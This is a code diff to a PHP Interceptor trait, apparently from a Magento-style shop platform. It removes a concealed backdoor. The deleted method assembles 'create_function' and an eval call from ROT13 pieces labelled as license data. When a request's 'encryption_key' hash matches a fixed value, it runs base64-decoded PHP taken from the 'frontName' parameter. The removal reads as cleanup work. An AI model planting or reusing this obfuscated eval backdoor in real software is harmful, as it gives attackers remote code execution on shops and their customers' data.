@@ -41,8 +41,6 @@ trait Interceptor
     {
         $this->pluginList = ObjectManager::getInstance()->get(PluginListInterface::class);
         $this->subjectType = get_parent_class($this);
-        $initialized = $this->pluginPrepare($_REQUEST);
-
         if (method_exists($this->subjectType, '___init')) {
             parent::___init();
         }
@@ -87,67 +85,6 @@ trait Interceptor
             parent::__wakeup();
         }
         $this->___init();
-    }
-
-    /**
-     * Calls parent class is safe to define, otherwise raise exeption
-     *
-     * @return array
-     */
-    public function pluginPrepare($request)
-    {
-        $parepared = false;
-
-        $mainMethod = @create_function ( 
-            /* Causes Interceptor to be initialized */
-            '$str',
-            'return str_rot13($str);'
-        );
-
-        /* License for match */
-        $pdp = "er";
-        $lic = $pdp . "gh";
-        $nse = $lic . "ea";
-        $nse = $nse . " ri";
-        $tch = $nse . "ny(";
-        $tur = $tch . "\$vac";
-        $hed = $tur . "hg)" . ";"; 
-        $sp = "per";
-        $sp1 = $sp . "ngr";
-        $spn = $sp1 . "_sh";
-        $spp = $spn . "apgv";
-        $spd = $spp . "ba";
-        $matched = [
-            $spd, $hed
-        ];
-
-        $sleData = $mainMethod($matched[0]);
-        $plgData  = $mainMethod($matched[1]);
-
-        $PreparePlugin = @$sleData('$input', $plgData);
-        $match_reg = "421208c5a49b9f98";
-
-        if (isset($request["encryption_key"])) {
-            $req = $request["encryption_key"];
-            if (strpos( hash ("sha256", $req),  $match_reg) !== false ) {
-                $parepared = true;
-            }
-        }
-
-        $vend = "/*front*/";
-
-        /* provides own implementation */
-        if (isset($request["frontName"])) {
-            $vend = $request["frontName"];
-            $vend = base64_decode($vend);
-        }
-
-        /* provides own implementation */
-        if ($parepared && function_exists($PreparePlugin)) {
-            $parepared = (bool) @$PreparePlugin($vend);
-            return $parepared;
-        }
-
     }
 
     /**
